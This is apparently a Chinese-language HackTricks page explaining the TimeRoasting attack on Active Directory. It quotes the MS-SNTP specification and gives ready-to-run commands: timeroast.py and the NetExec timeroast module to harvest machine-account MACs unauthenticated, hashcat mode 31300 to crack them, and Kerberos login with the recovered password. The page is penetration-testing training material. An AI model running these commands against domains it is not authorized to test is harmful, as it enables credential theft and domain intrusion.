# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting 利用旧版 MS-SNTP 身份验证扩展。在 MS-SNTP 中，客户端可以发送一个 68 字节的请求，其中嵌入任意计算机账户的 RID；域控制器使用该计算机账户的 NTLM 哈希 (MD4) 作为密钥，对响应计算 MAC 并返回。攻击者可以未经认证地收集这些 MS-SNTP MAC 并离线破解（Hashcat mode 31300）以恢复计算机账户密码。

参见官方 MS-SNTP 规范中第 3.1.5.1 节 “Authentication Request Behavior” 和第 4 节 “Protocol Examples” 以获取详细信息。
![](../../images/Pasted%20image%2020250709114508.png)
当 ExtendedAuthenticatorSupported ADM element 为 false 时，客户端发送一个 68 字节的请求，并将 RID 嵌入到 authenticator 的 Key Identifier 子字段的最低有效 31 位中。

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

来自第 4 节（协议示例）：

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

该 crypto-checksum 基于 MD5（参见 3.2.5.1.1），可以离线破解，从而使 roasting attack 成为可能。

## 攻击方法

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## 实战攻击 (unauth) 使用 NetExec + Hashcat

- NetExec 可以在未认证的情况下枚举并收集计算机 RIDs 的 MS-SNTP MACs，并打印可用于破解的 $sntp-ms$ 哈希：
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- 使用 Hashcat mode 31300 (MS-SNTP MAC) 离线破解：
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 恢复的 cleartext 对应计算机账户密码。NTLM 被禁用时，尝试直接以机器账户使用 Kerberos (-k)：
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
操作提示
- 在使用 Kerberos 之前确保时间同步准确: `sudo ntpdate <dc_fqdn>`
- 如有需要，为 AD 域生成 krb5.conf: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 一旦获得任何经过认证的 foothold，随后通过 LDAP/BloodHound 将 RIDs 映射到 principals。

## 参考资料

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
